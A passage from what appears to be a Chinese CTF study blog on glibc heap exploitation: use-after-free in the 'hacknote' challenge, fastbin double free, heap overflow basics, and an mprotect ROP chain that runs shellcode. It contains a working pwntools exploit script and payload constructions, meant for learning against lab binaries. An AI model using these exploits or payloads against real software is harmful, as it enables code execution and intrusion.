free(notelist[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析-¶-https-wiki-x10sec-org-pwn-heap-use-after-free-4"><a href="#利用分析-¶-https-wiki-x10sec-org-pwn-heap-use-after-free-4" class="headerlink" title="利用分析[¶](https://wiki.x10sec.org/pwn/heap/use_after_free/#_4"></a>利用分析[¶](<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/#_4" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/use_after_free/#_4</a></h3><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？<strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？                                                                         </p><p>我们可以简单来看一下每一个note生成的具体流程</p><ol><li><p>程序申请8字节内存用来存放note中的put以及content指针。</p></li><li><p>程序根据输入的size来申请指定大小的内存，然后用来存储content。</p></li></ol><ol><li><pre><code>   +-----------------+                          |   put           |                          +-----------------+                          |   content       |       size                 +-----------------+-------------------&gt;+----------------+                                          |     real       |                                          |    content     |                                          |                |                                          +----------------+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin  chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real  content的时候来进行覆盖。具体采用的思路如下</span><br><span class="line"></span><br><span class="line">- 申请note0，real content size为16（大小与note大小所在的bin不一样即可）</span><br><span class="line"></span><br><span class="line">- 申请note1，real content size为16（大小与note大小所在的bin不一样即可）</span><br><span class="line"></span><br><span class="line">- 释放note0</span><br><span class="line"></span><br><span class="line">- 释放note1</span><br><span class="line"></span><br><span class="line">- 此时，大小为16的fast bin chunk中链表为note1-&gt;note0</span><br><span class="line"></span><br><span class="line">- 申请note2，并且设置real content的大小为8，那么根据堆的分配规则</span><br><span class="line"></span><br><span class="line">- note2其实会分配note1对应的内存块。</span><br><span class="line"></span><br><span class="line">- real content 对应的chunk其实是note0。</span><br><span class="line"></span><br><span class="line">  这里注意：</span><br><span class="line"></span><br><span class="line">  在我们的两次free后</span><br><span class="line"></span><br><span class="line">  fastbin的结构为：</span><br><span class="line"></span><br><span class="line">  chunk1（8） ——》 chunk0（8）</span><br><span class="line"></span><br><span class="line">  content1（32） ——》chunk0（32）</span><br><span class="line"></span><br><span class="line">  根据从fastbin中malloc的机制</span><br><span class="line"></span><br><span class="line">  会根据大小和顺序，我们申请的大小是8字节，因此我们先申请的chunk2（8）为之前的chunk1（8），我们申请的content2（8）为之前的chunk0（8），因此就可以进行写入</span><br><span class="line"></span><br><span class="line">- 如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。</span><br><span class="line"></span><br><span class="line">### 利用脚本[¶](https:&#x2F;&#x2F;wiki.x10sec.org&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;#_5)</span><br></pre></td></tr></table></figure>#!/usr/bin/env python# -*- coding: utf-8 -*-</code></pre></li></ol><p>from pwn import *</p><p>r = process(‘./hacknote’)</p><p>def addnote(size, content):<br>    r.recvuntil(“:”)<br>    r.sendline(“1”)<br>    r.recvuntil(“:”)<br>    r.sendline(str(size))<br>    r.recvuntil(“:”)<br>    r.sendline(content)</p><p>def delnote(idx):<br>    r.recvuntil(“:”)<br>    r.sendline(“2”)<br>    r.recvuntil(“:”)<br>    r.sendline(str(idx))</p><p>def printnote(idx):<br>    r.recvuntil(“:”)<br>    r.sendline(“3”)<br>    r.recvuntil(“:”)<br>    r.sendline(str(idx))</p><p>#gdb.attach(r)<br>magic = 0x08048986</p><p>addnote(32, “aaaa”) # add note 0<br>addnote(32, “ddaa”) # add note 1</p><p>delnote(0) # delete note 0<br>delnote(1) # delete note 1</p><p>addnote(8, p32(magic)) # add note 2</p><p>printnote(0) # print note 0</p><p>r.interactive()</p><p>```</p><h2 id="3-例题"><a href="#3-例题" class="headerlink" title="3.例题"></a>3.例题</h2><p>2016Hctf</p><p>暂时还不会，，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin attack</title>
      <link href="/2020/02/02/Fastbin%20attack/"/>
      <url>/2020/02/02/Fastbin%20attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><a id="more"></a><p>1、fastbin chunk 结构<br>未分配的chunk<br>|         |  size  ｜<br>|  fd  ｜         ｜<br>已分配chunk<br>｜       ｜   size  ｜<br>｜    content     ｜<br>        ……<br>malloc返回的指针指向content位置</p><h2 id="1-Fastbin-double-free"><a href="#1-Fastbin-double-free" class="headerlink" title="1.Fastbin double free"></a>1.Fastbin double free</h2><p>注意这里：malloc返回的指针指向content位置</p><p>content包含 fd bk 与data</p><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin  链表中存在多次。这样导致的后果是多次分配可以从 fastbin  链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><p>图解：</p><p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1&#x3D;malloc(0x10);</span><br><span class="line">    chunk2&#x3D;malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line">    free(chunk2);</span><br><span class="line">    free(chunk1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 第一次释放<code>free(chunk1)</code></p><p><img src="https://wiki.x10sec.org/pwn/heap/figure/fastbin_free_chunk1.png" alt="img"></p><p>第二次释放<code>free(chunk2)</code></p><p><img src="https://wiki.x10sec.org/pwn/heap/figure/fastbin_free_chunk2.png" alt="img"></p><p>第三次释放<code>free(chunk1)</code></p><p><img src="https://wiki.x10sec.org/pwn/heap/figure/fastbin_free_chunk3.png" alt="img"></p><p><strong>例子：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">bss_chunk.<span class="built_in">size</span>=<span class="number">0x21</span>;</span><br><span class="line">chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//a</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="built_in">free</span>(chunk1);<span class="comment">//b</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//c</span></span><br><span class="line">*(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;<span class="comment">//d</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//e</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a 此句执行完后，chunk1,chunk2会在连续的区域内，在内存里的表现<br>｜chunk1||chunk2|<br>low addr—–&gt;high addr</p><p>b 如果直接连续free(chunk1),会被libc检查出double free(检查方式为free时看放入链表的指针与链表现在的指针是否同一个。如fastbin-&gt;a,free(a)则检查出double free。如果fastbin-&gt;b-&gt;a。free(a)则bypass)<br>此时fastbin链表为：<br>main_arena.fastbin—&gt;chunk1—&gt;chunk2—&gt;chunk1（注意chunk1的fd也是指向chunk2,即chunk1和chunk2是一个环形链表）<br>在内存中表现如下：<br>chunk1_addr:    ｜        0        ｜    0x11    ｜<br>            ｜    chunk2_addr    ｜            ｜<br>chunk2_addr:    ｜        0        ｜    0x11    ｜<br>            ｜    chunk1_addr    ｜            ｜</p><p>c 分配时从fastbin的首部取出，即chunk_a获得的是chunk1的地址<br>d 修改chunk_a即修改chunk1的fd位置，把此处修改为全局变量bss_chunk的地址<br>此时fastbin链表为fastbin—&gt;chunk2—&gt;chunk1—&gt;bss_chunk</p><p>e 经过3次malloc(0x11)，依次从fastbin中取出，此次取出的地址就是我们写入的地址</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存修改</title>
      <link href="/2020/02/01/%E5%86%85%E5%AD%98%E4%BF%AE%E6%94%B9/"/>
      <url>/2020/02/01/%E5%86%85%E5%AD%98%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h1><a id="more"></a><h3 id="如何进行内存的权限修改"><a href="#如何进行内存的权限修改" class="headerlink" title="如何进行内存的权限修改"></a>如何进行内存的权限修改</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call &#x3D; push + jmp</span><br><span class="line">所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在</span><br><span class="line">mprotect地址后在压入一个返回地址.</span><br><span class="line">2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push....</span><br><span class="line">所以基本的payload可以构思如下:</span><br><span class="line">payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload +&#x3D; p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)</span><br><span class="line"></span><br><span class="line">这里的mprotect_addr就是我们要跳转到mprotect函数的地址</span><br><span class="line">ret_addr 为 mprotect函数执行完后的地址.</span><br><span class="line">argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)</span><br><span class="line">argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)</span><br><span class="line">argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 &#x3D; 4 + 2 +1 (rwx)</span><br><span class="line"></span><br><span class="line">为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令</span><br><span class="line">为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈</span><br><span class="line">完好.</span><br><span class="line">#注意：</span><br><span class="line">这里的三个pop应该是将调用函数传参的那三个push进去的参数弹出，这样的话就会使得堆栈平衡，因为调用函数的时候指针应该指向返回地址，如果不pop * 3 的话就不会返回，导致堆栈不平衡。（仅仅是个人理解）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 ROPgadget --binary get_started_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop</span><br><span class="line">存在pop的一些指令地址,可以发现:</span><br><span class="line">0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">那我们就得到了该地址.</span><br><span class="line">上面的ret_addr就填写0x0804f460</span><br><span class="line">而现在的payload就可以为:</span><br><span class="line">payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload +&#x3D; p32(ret_addr2)</span><br><span class="line"></span><br><span class="line">ret_addr2 即为执行完mprotect函数即弹出栈后的返回地址.我们也就可以再次利用栈的ret来控制eip,</span><br><span class="line">即为下一个函数read的地址.</span><br></pre></td></tr></table></figure><h2 id="如何向内存写入shellcode"><a href="#如何向内存写入shellcode" class="headerlink" title="如何向内存写入shellcode"></a>如何向内存写入shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">好下面我们就要构思如何将自己的shellcode写入内存再执行,使用read函数写入.</span><br><span class="line">read函数原型:</span><br><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">fd 设为0时就可以从输入端读取内容    设为0</span><br><span class="line">buf 设为我们想要执行的内存地址     设为我们已找到的内存地址0x80EB000</span><br><span class="line">size 适当大小就可以              设为0x100就可以了</span><br><span class="line"></span><br><span class="line">现在的payload也就可以构造如下</span><br><span class="line">payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload +&#x3D; p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)</span><br><span class="line">read函数也跟mprotect一样的例子,就是 call &#x3D; push + jmp.</span><br><span class="line">read_addr 后面的一个ret_addr2就是执行完read函数后的返回地址.再次使用pop3_ret弹掉3个已用的参数,接着还可</span><br><span class="line">以利用栈ret来控制eip跳转到mem_addr执行自己的shellcode, payload如下.</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload +&#x3D; p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)</span><br><span class="line">payload +&#x3D; p32(mem_addr)</span><br><span class="line"></span><br><span class="line">然而在执行read函数时就可以输入shellcode,即payload2为:</span><br><span class="line">payload_sh &#x3D; asm(shellcraft.sh(),arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出</title>
      <link href="/2020/01/30/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2020/01/30/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="堆溢出略写"><a href="#堆溢出略写" class="headerlink" title="堆溢出略写"></a>堆溢出略写</h1><a id="more"></a><p>前言：</p><p>众所周知堆和栈一点都不一样，但是这也忒不一样了</p><p>栈溢出是溢出储存单元</p><p>然而堆溢出在我这个垃圾看来应该是从一个申请的堆块溢出到相邻物理地址的新的堆块中去</p><p>堆的申请事由低地址向高地址创建的</p><h2 id="1-基本策略"><a href="#1-基本策略" class="headerlink" title="1.基本策略"></a>1.基本策略</h2><ol><li><p>覆盖与其</p><p>物理相邻的下一个 chunk</p><p> 的内容。</p><ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA </li><li>IS_MAPPED  </li><li>PREV_INUSE </li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li><p>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p></li></ol><p>注意，前面的pre_sive与size是按照机器字长来计算的，不同的字长长度不同</p><h2 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk  的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top  chunk)。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;&#x3D;&#x3D;&#x3D;top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>进行写入 ‘A’*100 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x4141414141414141 &lt;&#x3D;&#x3D;&#x3D;top chunk(已被溢出)</span><br><span class="line">0x602030:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602040:   0x4141414141414141  0x4141414141414141</span><br></pre></td></tr></table></figure><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><h3 id="寻找堆分配函数¶"><a href="#寻找堆分配函数¶" class="headerlink" title="寻找堆分配函数¶"></a>寻找堆分配函数<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_5" target="_blank" rel="noopener">¶</a></h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">&#x2F;&#x2F;等同于</span><br><span class="line">ptr&#x3D;malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure><p> 除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk&#x3D;malloc(16);</span><br><span class="line">  chunk1&#x3D;realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p><ul><li>当realloc(ptr,size)的size不等于ptr的size时<ul><li>如果申请size&gt;原来size<ul><li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li><li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) </li></ul></li><li>如果申请size&lt;原来size<ul><li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li><li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li></ul></li></ul></li><li>当realloc(ptr,size)的size等于0时，相当于free(ptr)</li><li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li></ul><h3 id="寻找危险函数¶"><a href="#寻找危险函数¶" class="headerlink" title="寻找危险函数¶"></a>寻找危险函数<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_6" target="_blank" rel="noopener">¶</a></h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p><p>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度¶"><a href="#确定填充长度¶" class="headerlink" title="确定填充长度¶"></a>确定填充长度<a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/#_7" target="_blank" rel="noopener">¶</a></h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc  分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行<code>malloc(0)</code>会返回用户区域为16字节的块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk&#x3D;malloc(0);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据系统的位数，malloc会分配8或16字节的用户空间</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p> 注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长</p><p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk&#x3D;malloc(24);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br></pre></td></tr></table></figure><p> 16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* pad request bytes into a usable size -- internal version *&#x2F;</span><br><span class="line">&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>当req=24时，request2size(24)=32。而除去chunk  